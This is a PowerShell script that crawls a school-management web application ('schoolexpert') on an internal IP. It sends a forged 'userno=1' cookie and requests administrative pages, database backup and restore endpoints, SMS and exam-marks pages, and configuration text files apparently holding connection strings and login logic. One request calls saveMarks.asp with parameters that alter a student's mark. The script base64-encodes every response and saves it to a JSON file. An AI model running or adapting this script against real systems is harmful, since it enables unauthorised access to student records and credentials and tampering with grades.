# --- Configuration ---
$BaseUrl    = "http://192.168.29.20"
$UserAgent  = "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
$Cookie     = "fy=2025; userno=1;"
$Timeout    = 120 
$OutputFile = Join-Path $env:TEMP "Internal_Crawl_$(Get-Date -Format 'yyyyMMdd_HHmm').json"

# --- Core Targets ---
$CorePaths = @(
    "/",
    "/schoolexpert",
    "/schoolexpert/modules",
    "/schoolexpert/dashboard",
    "/schoolexpert/dashboardv2"
)

# --- Auto expand .asp / .php ---
$ExpandedCore = @()
foreach ($path in $CorePaths) {
    $ExpandedCore += "$path.asp"
    $ExpandedCore += "$path.php"
}

# --- Admin Endpoints ---
$AdminPaths = @(
    "/schoolexpert/mstrUsers.asp",
    "/schoolexpert/adminDatabaseBackup.asp",
    "/schoolexpert/adminDatabaseRestore.asp",
    "/schoolexpert/adminSchoolSetup.asp",
    "/schoolexpert/adminChangePswd.asp",
    "/schoolexpert/administrator.asp"
)

# --- SMS Endpoints ---
$SmsPaths = @(
    "/schoolexpert/smsStudents.asp",
    "/schoolexpert/smsEmployeesNew.asp",
    "/schoolexpert/smsTemplates.asp",
    "/schoolexpert/smsAPI.asp",
    "/schoolexpert/notificationStudents.asp"
)

# --- Examination Endpoints ---
$ExamPaths = @(
    "/schoolexpert/examMarksEntry.asp",
    "/schoolexpert/examMarksEntry2.asp",
    "/schoolexpert/examMarksEntry3.asp",
    "/schoolexpert/examMarksEntry4.asp",
    "/schoolexpert/studentWiseMarksEntry.asp",
    "/schoolexpert/coScholasticGradesEntry.asp"
)

# --- Custom / Sensitive ---
$CustomPaths = @(
    "/schoolexpert/saveMarks.asp",
    "/schoolexpert/saveMarks.asp?marksObt=19&adm_no=18887&maxMarks=25&fy=2025&userNo=1",
    "/schoolexpert/connection.txt",
    "/schoolexpert/loginCheck.txt",
    "/schoolexpert/StudentloginCheck.txt",
    "/schoolexpert/schoolDetails.txt",
    "/schoolexpert/onlineconnection.txt",
    "/schoolexpert/SELibrary.txt"
)

# --- Merge All ---
$Paths = $ExpandedCore + $AdminPaths + $SmsPaths + $ExamPaths + $CustomPaths

# --- Headers ---
$Headers = @{
    "User-Agent" = $UserAgent
    "Cookie"     = $Cookie
    "Referer"    = "$BaseUrl/schoolexpert"
}

$AllResults = @()

Write-Host "Starting Data Extraction..." -ForegroundColor Cyan
Write-Host "Target: $BaseUrl"
Write-Host "Total Paths: $($Paths.Count)"

foreach ($Path in $Paths) {
    $FullUrl = "$BaseUrl$Path"

    $Entry = [ordered]@{
        url           = $FullUrl
        timestamp     = (Get-Date).ToString("o")
        status_code   = 0
        content_found = $false
        base64_body   = ""
        error         = ""
    }

    try {
        $Response = Invoke-WebRequest `
            -Uri $FullUrl `
            -Headers $Headers `
            -Method Get `
            -TimeoutSec $Timeout `
            -ErrorAction Stop

        $Entry.status_code   = [int]$Response.StatusCode
        $Entry.content_found = $true

        $RawBytes = $Response.Content
        if ($RawBytes -is [string]) {
            $RawBytes = [System.Text.Encoding]::UTF8.GetBytes($RawBytes)
        }

        $Entry.base64_body = [Convert]::ToBase64String($RawBytes)

        Write-Host "[+] $Path" -ForegroundColor Green
    } catch {
        $Entry.error = $_.Exception.Message
        if ($_.Exception.Response) {
            $Entry.status_code = [int]$_.Exception.Response.StatusCode
        }

        Write-Host "[-] $Path" -ForegroundColor Red
    }

    $AllResults += $Entry
}

# --- Save ---
$AllResults | ConvertTo-Json -Depth 10 | Set-Content -Path $OutputFile -Encoding UTF8

Write-Host "`nDone. Saved to: $OutputFile" -ForegroundColor Yellow
